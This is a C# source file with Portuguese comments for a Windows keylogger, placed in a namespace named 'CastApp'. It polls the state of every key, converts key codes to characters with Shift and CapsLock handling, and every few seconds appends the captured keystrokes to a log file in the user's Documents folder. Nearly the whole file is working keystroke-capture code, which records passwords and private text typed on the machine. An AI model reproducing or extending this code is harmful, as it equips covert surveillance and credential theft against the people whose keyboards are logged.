using System.Text;

namespace CastApp
{
    public class Program
    {
        /// <summary>
        /// Pasta e arquivo de log
        /// </summary>
        private static readonly string LogDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "KeyLogger");
        private static readonly string LogFile = Path.Combine(LogDirectory, "keylog.txt");

        /// <summary>
        /// Lock para escrita no arquivo para evitar condições de corrida em ambientes multithread
        /// Basicamente trava o acesso ao arquivo para que apenas uma thread possa escrever nele de cada vez
        /// </summary>
        private static readonly object FileLock = new object();

        /// <sumary>
        /// Buffer para armazenar teclas antes de escrever no arquivo
        /// Assim, evitamos múltiplas escritas pequenas e melhoramos a performance
        /// buffer basicamente e uma area de memoria temporaria onde guardamos os dados antes de os processar ou guardar em algum sitio
        /// </sumary>
        private static readonly StringBuilder KeyBuffer = new StringBuilder();
        private static DateTime lastFlush = DateTime.Now;
        private static readonly TimeSpan FlushInterval = TimeSpan.FromSeconds(5);

        /// <summary>
        /// Ponmto de entrada do programa
        /// Onde tudo começa
        /// <summary>
        private static void Main()
        {
            try
            { 
                InitializeLogFile();
                StartKeyCapture();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro fatal: {ex.Message}");
                Console.ReadKey();
            }
        }

        /// <summary>
        /// Inicializa o arquivo de log
        /// </summary>
        private static void InitializeLogFile()
        {
            try
            {
                if (!Directory.Exists(LogDirectory))
                {
                    Directory.CreateDirectory(LogDirectory);
                }

                if (!File.Exists(LogFile))
                {
                    using (var sw = File.CreateText(LogFile))
                    {
                        sw.WriteLine($"=== KeyLogger iniciado em {DateTime.Now:yyyy-MM-dd HH:mm:ss} ===");
                    }
                }
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException($"Não foi possível inicializar o arquivo de log: {ex.Message}");
            }
        }

        /// <summary>
        /// Loop principal de captura de teclas
        /// </summary>
        private static void StartKeyCapture()
        {
            while (true)
            {
                try
                {
                    if (DateTime.Now - lastFlush > FlushInterval)
                    {
                        FlushBuffer();
                    }

                    bool leftShift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0;
                    bool rightShift = (Natives.GetAsyncKeyState(161) & 0x8000) != 0;
                    bool shift = leftShift || rightShift;
                    bool capsLock = Console.CapsLock;

                    for (int vkCode = 0; vkCode < 256; vkCode++)
                    {
                        short keyState = (short)Natives.GetAsyncKeyState(vkCode);

                        if (keyState == 1 || keyState == -32767)
                        {
                            ProcessKey(vkCode, shift, capsLock);
                        }
                    }

                    Thread.Sleep(1);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Erro no loop principal: {ex.Message}");
                    Thread.Sleep(100);
                }
            }
        }

        /// <summary>
        /// Processa uma tecla pressionada
        /// </summary>
        private static void ProcessKey(int vkCode, bool shift, bool capsLock)
        {
            try
            {
                var keyInfo = GetKeyInfo(vkCode, shift, capsLock);

                if (!string.IsNullOrEmpty(keyInfo))
                {
                    lock (KeyBuffer)
                    {
                        KeyBuffer.Append(keyInfo);
                    }

                    Console.Write(keyInfo);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro ao processar tecla {vkCode}: {ex.Message}");
            }
        }

        /// <summary>
        /// Converte código de tecla virtual para caractere/string
        /// Faz o mapeamento das teclas considerando Shift e CapsLock
        /// e retorna a representação correta
        /// Basicamnete faz o mesmo que a funcao TeclaPrecionada do natives mas de uma forma mais eficiente
        /// </summary>
        private static string GetKeyInfo(int vkCode, bool shift, bool capsLock)
        {
            return vkCode switch
            {
                // Teclas especiais
                8 => "[BACKSPACE]", // Backspace
                9 => "\t",           // Tab
                13 => "\r\n",        // Enter
                27 => "[ESC]",       // Escape
                32 => " ",           // Espaço

                // Teclas de função
                >= 112 and <= 123 => $"[F{vkCode - 111}]", // F1-F12

                // Setas
                37 => "[←]", // Esquerda
                38 => "[↑]", // Cima
                39 => "[→]", // Direita
                40 => "[↓]", // Baixo

                // Letras A-Z
                >= 65 and <= 90 => ProcessLetter((char)vkCode, shift, capsLock),

                // Números e símbolos
                >= 48 and <= 57 => ProcessNumber(vkCode, shift),

                // Numpad
                >= 96 and <= 105 => ((char)(vkCode - 48)).ToString(), // Numpad 0-9

                // Pontuação comum
                186 => shift ? ":" : ";",    // ;:
                187 => shift ? "+" : "=",    // =+
                188 => shift ? "<" : ",",    // ,<
                189 => shift ? "_" : "-",    // -_
                190 => shift ? ">" : ".",    // .>
                191 => shift ? "?" : "/",    // /?
                192 => shift ? "~" : "`",    // `~
                219 => shift ? "{" : "[",    // [{
                220 => shift ? "|" : "\\",   // \|
                221 => shift ? "}" : "]",    // ]}
                222 => shift ? "\"" : "'",   // '"

                // Outras teclas especiais
                16 => "[SHIFT]",
                17 => "[CTRL]",
                18 => "[ALT]",
                20 => "[CAPS]",
                144 => "[NUMLOCK]",
                145 => "[SCROLL]",

                _ => null! // Tecla não mapeada
            };
        }

        /// <summary>
        /// Processa letras considerando Shift e CapsLock
        /// Basicamente verifica se a letra deve ser maiúscula ou minúscula
        /// </summary>
        private static string ProcessLetter(char letter, bool shift, bool capsLock)
        {
            // XOR entre shift e capslock determina se a letra deve ser maiúscula
            bool shouldBeUpper = shift ^ capsLock;
            return shouldBeUpper ? letter.ToString() : char.ToLower(letter).ToString();
        }

        /// <summary>
        /// Processa números e seus símbolos correspondentes
        /// </summary>
        private static string ProcessNumber(int vkCode, bool shift)
        {
            return vkCode switch
            {
                48 => shift ? ")" : "0",
                49 => shift ? "!" : "1",
                50 => shift ? "@" : "2",
                51 => shift ? "#" : "3",
                52 => shift ? "$" : "4",
                53 => shift ? "%" : "5",
                54 => shift ? "^" : "6",
                55 => shift ? "&" : "7",
                56 => shift ? "*" : "8",
                57 => shift ? "(" : "9",
                _ => null!
            };
        }

        /// <summary>
        /// Escreve o buffer no arquivo de log
        /// Serve para pegar todas as teclas que estao no buffer e escreve no arquivo de log
        /// </summary>
        private static void FlushBuffer()
        {
            try
            {
                string content;
                lock (KeyBuffer)
                {
                    if (KeyBuffer.Length == 0) return;

                    content = KeyBuffer.ToString();
                    KeyBuffer.Clear();
                }

                lock (FileLock)
                {
                    File.AppendAllText(LogFile, content, Encoding.UTF8);
                }

                lastFlush = DateTime.Now;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro ao escrever no arquivo: {ex.Message}");
            }
        }
    }
}